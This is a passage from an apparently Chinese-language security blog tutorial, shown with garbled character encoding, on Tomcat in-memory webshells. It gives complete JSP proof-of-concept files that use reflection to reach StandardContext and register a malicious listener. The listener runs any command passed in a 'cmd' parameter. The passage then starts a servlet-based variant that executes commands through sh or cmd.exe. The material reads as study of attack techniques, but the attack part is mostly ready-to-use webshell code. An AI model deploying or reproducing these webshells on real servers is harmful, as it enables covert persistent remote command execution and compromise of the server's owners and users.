</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">shell</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸¤ä¸ªç‚¹è¯´æ˜ä¸€ä¸‹ï¼š</p>
<ul>
<li>badListener ä¸ºä»€ä¹ˆæ˜¯ServletRequestListenerå‹</li>
</ul>
<p>è¿˜æ˜¯ä»fireRequestInitEvent()æ–¹æ³•è¯´æ˜ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055525.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901175538406"
	
	
></p>
<p>å·²ç»å¾ˆå¥½ç†è§£äº†ï¼Œinstanceså³listenerâ€œåˆé›†â€ï¼Œè¿™é‡Œifåˆ¤æ–­å¿…é¡»æ˜¯ServletRequestListenerå‹æ‰èƒ½æˆåŠŸè°ƒç”¨åˆ°listenerä¸­çš„requestInitialized()æ–¹æ³•ã€‚</p>
<ul>
<li>listenerä¸­è¿˜å®ç°äº†ä¸€æ¬¡ç±»å‹è½¬æ¢</li>
</ul>
<p>è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºServletRequestä¸€èˆ¬æˆ‘ä»¬åˆ©ç”¨çš„requestå°±æ˜¯è¿™ä¸ªç±»å‹ã€‚åœ¨è¿™é‡Œè°ƒç”¨çš„ServletRequestEventç±»çš„getServletRequest()æ–¹æ³•å¦‚ä¸‹ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055534.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901192516778"
	
	
></p>
<p>å°±æ˜¯è·å–çš„ServletRequestç±»å‹çš„requestã€‚</p>
<p><strong>æ³¨å…¥æ¶æ„ä»£ç </strong>ï¼š</p>
<p>è¿™é‡Œå°±æ˜¯åˆ©ç”¨å‰é¢è¯´è¿‡çš„setApplicationEventListeners()æ–¹æ³•ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ–¹æ³•æ¥æ”¶ä¸€ä¸ªObjectæ•°ç»„ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055591.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901193828863"
	
	
></p>
<p>æ‰€ä»¥éœ€è¦å°†badListenerè®¾ç½®ä¸ºæ•°ç»„å½¢å¼ç›´æ¥å°†å‰é¢è®¾è®¡å¥½çš„listeneråŠ è¿›å»å³å¯ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//è·å–StandardContextå¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">field1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//ç¼–å†™æ¶æ„listener</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletRequestListener</span><span class="w"> </span><span class="n">badListener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ServletRequestListener</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestroyed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;é”€æ¯&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestInitialized</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ServletRequest</span><span class="p">)</span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">shell</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">shell</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//æ³¨å…¥æ¶æ„ä»£ç </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">setApplicationEventListeners</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">badListener</span><span class="p">});</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜æœ‰çš„å°±æ˜¯æˆ‘çœ‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œ<strong>æ³¨å…¥æ¶æ„listeneræ—¶å¥½åƒéƒ½æ˜¯ç”¨çš„addApplicatioinEventListener()æ–¹æ³•</strong>ï¼Œå¦‚ä¸‹ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055758.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901200742920"
	
	
></p>
<p>åªæ˜¯æˆ‘è¿™é‡Œç”¨çš„setApplicationEventListeners()ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055874.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901200833218"
	
	
></p>
<h6 id="æœ€ç»ˆpoc-1">æœ€ç»ˆPOC
</h6><p>åŠ å…¥åˆ°jspä¸­å°±æ˜¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">    //è·å–StandardContextå¯¹è±¡
</span></span><span class="line"><span class="cl">    ServletContext servletContext = request.getSession().getServletContext();
</span></span><span class="line"><span class="cl">    Field field0 = servletContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">    field0.setAccessible(true);
</span></span><span class="line"><span class="cl">    ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext);
</span></span><span class="line"><span class="cl">    Field field1 = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">    field1.setAccessible(true);
</span></span><span class="line"><span class="cl">    StandardContext standardContext = (StandardContext)field1.get(applicationContext);
</span></span><span class="line"><span class="cl">//ç¼–å†™æ¶æ„listener
</span></span><span class="line"><span class="cl">    ServletRequestListener badListener = new ServletRequestListener(){
</span></span><span class="line"><span class="cl">        public void requestDestroyed(ServletRequestEvent sre) {
</span></span><span class="line"><span class="cl">            System.out.println(&#34;é”€æ¯&#34;);
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        public void requestInitialized(ServletRequestEvent sre) {
</span></span><span class="line"><span class="cl">            ServletRequest request = (ServletRequest)sre.getServletRequest();
</span></span><span class="line"><span class="cl">            String shell = request.getParameter(&#34;cmd&#34;);
</span></span><span class="line"><span class="cl">            if(shell != null){
</span></span><span class="line"><span class="cl">                try {
</span></span><span class="line"><span class="cl">                    Runtime.getRuntime().exec(shell);
</span></span><span class="line"><span class="cl">                } catch (IOException e) {
</span></span><span class="line"><span class="cl">                    e.printStackTrace();
</span></span><span class="line"><span class="cl">                }
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    };
</span></span><span class="line"><span class="cl">//æ³¨å…¥æ¶æ„ä»£ç 
</span></span><span class="line"><span class="cl">    standardContext.setApplicationEventListeners(new Object[]{badListener});
</span></span><span class="line"><span class="cl">//æç¤º
</span></span><span class="line"><span class="cl">    out.println(&#34;æ³¨å…¥æˆåŠŸ&#34;);
</span></span><span class="line"><span class="cl">%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åè®¿é—®injection.jspï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055960.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901194707829"
	
	
></p>
<p>æˆåŠŸæ³¨å…¥ï¼Œå†éšä¾¿è¯·æ±‚èµ„æºåŠ ä¸Šå‚æ•°ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055188.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901194757468"
	
	
></p>
<p>æˆåŠŸå‘½ä»¤æ‰§è¡Œã€‚</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<p>å¦‚æœç”¨addApplicationEventListener()æ–¹æ³•çš„è¯å°±æ˜¯å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">    //è·å–StandardContextå¯¹è±¡
</span></span><span class="line"><span class="cl">    ServletContext servletContext = request.getSession().getServletContext();
</span></span><span class="line"><span class="cl">    Field field0 = servletContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">    field0.setAccessible(true);
</span></span><span class="line"><span class="cl">    ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext);
</span></span><span class="line"><span class="cl">    Field field1 = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">    field1.setAccessible(true);
</span></span><span class="line"><span class="cl">    StandardContext standardContext = (StandardContext)field1.get(applicationContext);
</span></span><span class="line"><span class="cl">//ç¼–å†™æ¶æ„listener
</span></span><span class="line"><span class="cl">    ServletRequestListener badListener = new ServletRequestListener(){
</span></span><span class="line"><span class="cl">        public void requestDestroyed(ServletRequestEvent sre) {
</span></span><span class="line"><span class="cl">            System.out.println(&#34;é”€æ¯&#34;);
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        public void requestInitialized(ServletRequestEvent sre) {
</span></span><span class="line"><span class="cl">            ServletRequest request = (ServletRequest)sre.getServletRequest();
</span></span><span class="line"><span class="cl">            String shell = request.getParameter(&#34;cmd&#34;);
</span></span><span class="line"><span class="cl">            if(shell != null){
</span></span><span class="line"><span class="cl">                try {
</span></span><span class="line"><span class="cl">                    Runtime.getRuntime().exec(shell);
</span></span><span class="line"><span class="cl">                } catch (IOException e) {
</span></span><span class="line"><span class="cl">                    e.printStackTrace();
</span></span><span class="line"><span class="cl">                }
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    };
</span></span><span class="line"><span class="cl">//æ³¨å…¥æ¶æ„ä»£ç 
</span></span><span class="line"><span class="cl">    standardContext.addApplicationEventListener(badListener);
</span></span><span class="line"><span class="cl">//æç¤º
</span></span><span class="line"><span class="cl">    out.println(&#34;æ³¨å…¥æˆåŠŸ&#34;);
</span></span><span class="line"><span class="cl">%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜æ˜¯å…ˆè®¿é—®jspæ–‡ä»¶ï¼Œå†è¯·æ±‚èµ„æºå¹¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055106.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240901201216008"
	
	
></p>
<p>æˆåŠŸæ‰§è¡Œã€‚</p>
<h4 id="sevletå‹å†…å­˜é©¬">Sevletå‹å†…å­˜é©¬
</h4><p>åŒæ ·çš„ä»¥ä¸€ä¸ªç®€å•çš„servletæ¥åˆ†æä¸€ä¸‹æµç¨‹ã€‚</p>
<p>web.xmlï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;servlet&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-name&gt;</span>ServletTest<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-class&gt;</span>Servlet.ServletTest<span class="nt">&lt;/servlet-class&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/servlet&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;servlet-mapping&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-name&gt;</span>ServletTest<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;url-pattern&gt;</span>/servlet<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/servlet-mapping&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ServletTest.java:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Servlet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Scanner</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.PrintWriter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebServlet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@WebServlet</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/servlet&#34;</span><span class="p">,</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ServletTest&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ServletTest</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Servlet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">ServletConfig</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">ServletConfig</span><span class="w"> </span><span class="nf">getServletConfig</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">service</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;servletå¯åŠ¨&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">osTyp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;os.name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">osTyp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">osTyp</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;win&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">cmds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">}</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">};</span><span class="w">
